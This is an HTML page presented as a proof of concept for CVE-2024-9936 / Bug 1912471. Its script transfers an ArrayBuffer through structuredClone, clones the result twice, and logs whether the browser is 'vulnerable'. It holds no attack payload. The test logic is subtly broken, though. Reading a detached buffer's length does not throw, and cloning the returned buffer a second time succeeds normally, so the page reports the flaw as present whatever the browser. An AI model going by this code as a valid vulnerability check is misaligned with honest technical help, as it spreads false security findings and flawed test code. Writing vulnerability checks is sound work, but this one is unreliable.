<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC for CVE-2024-9936 / Bug 1912471</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background-color: #f0f0f0;
      margin: 0;
      padding: 20px;
    }
    #output {
      width: 80%;
      margin: 20px auto;
      padding: 10px;
      border: 2px solid #333;
      background-color: #fff;
      text-align: left;
      height: 400px;
      overflow-y: scroll;
      box-sizing: border-box;
    }
    button {
      padding: 10px 20px;
      margin: 10px;
      font-size: 16px;
      cursor: pointer;
    }
    .log {
      margin: 5px 0;
    }
    .success {
      color: green;
    }
    .error {
      color: red;
    }
  </style>
</head>
<body>
  <h1>PoC for CVE-2024-9936 / Bug 1912471</h1>
  <button id="run-poc">Run PoC</button>
  <div id="output"></div>

  <script>
    class Logger {
      constructor(outputElement) {
        this.output = outputElement;
      }

      log(message, type = 'log') {
        const p = document.createElement('p');
        p.textContent = message;
        p.className = `log ${type}`;
        this.output.appendChild(p);
        this.output.scrollTop = this.output.scrollHeight;
        console[type === 'error' ? 'error' : 'log'](message);
      }
    }

    document.addEventListener('DOMContentLoaded', () => {
      const runButton = document.getElementById('run-poc');
      const output = document.getElementById('output');
      const logger = new Logger(output);

      runButton.addEventListener('click', () => {
        runButton.disabled = true;
        logger.log('Starting PoC...');
        performPoC(logger).then(() => {
          runButton.disabled = false;
        }).catch((err) => {
          logger.log(`PoC completed with error: ${err}`, 'error');
          runButton.disabled = false;
        });
      });

      async function performPoC(logger) {
        // Step 1: Create a transferable object
        const buffer = new ArrayBuffer(16);
        const view = new Uint8Array(buffer);
        for (let i = 0; i < view.length; i++) {
          view[i] = i;
        }
        logger.log('Created ArrayBuffer and initialized with data.');

        // Step 2: Serialize the object with transferables
        let serialized;
        try {
          serialized = structuredClone(buffer, { transfer: [buffer] });
          logger.log('ArrayBuffer serialized with transferables.');
        } catch (e) {
          logger.log(`Serialization error: ${e.message}`, 'error');
          return;
        }

        // Step 3: Check that the original buffer has been detached
        try {
          console.log(buffer.byteLength);
          logger.log('Error: ArrayBuffer should be detached and inaccessible.', 'error');
        } catch (e) {
          logger.log('ArrayBuffer successfully detached after serialization.');
        }

        // Step 4: Deserialize the first time - should succeed
        let clonedBuffer;
        try {
          clonedBuffer = structuredClone(serialized);
          logger.log('First deserialization succeeded.');
        } catch (e) {
          logger.log(`First deserialization error: ${e.message}`, 'error');
          return;
        }

        // Step 5: Verify the contents of the deserialized buffer
        const clonedView = new Uint8Array(clonedBuffer);
        let dataValid = true;
        for (let i = 0; i < clonedView.length; i++) {
          if (clonedView[i] !== i) {
            dataValid = false;
            break;
          }
        }
        if (dataValid) {
          logger.log('Deserialized ArrayBuffer contains valid data.', 'success');
        } else {
          logger.log('Deserialized ArrayBuffer contains invalid data.', 'error');
        }

        // Step 6: Attempt to deserialize the same buffer a second time - expect error
        let vulnerabilityExists = false;
        try {
          const clonedBuffer2 = structuredClone(serialized);
          logger.log('Error: Second deserialization succeeded, which should not happen.', 'error');
          vulnerabilityExists = true;
        } catch (e) {
          logger.log(`Expected error on second deserialization: ${e.message}`, 'success');
          if (/cannot transfer twice|transferable/.test(e.message)) {
            logger.log('Browser correctly handled second deserialization of transferables.', 'success');
          } else {
            logger.log('Browser threw an error, but the message was unexpected.', 'error');
            vulnerabilityExists = true;
          }
        }

        // Step 7: Final conclusion
        if (vulnerabilityExists) {
          logger.log('**Vulnerability CVE-2024-9936 / Bug 1912471 is PRESENT in the current browser version.**', 'error');
        } else {
          logger.log('**Vulnerability CVE-2024-9936 / Bug 1912471 is ABSENT in the current browser version.**', 'success');
        }
      }
    });
  </script>
</body>
</html>
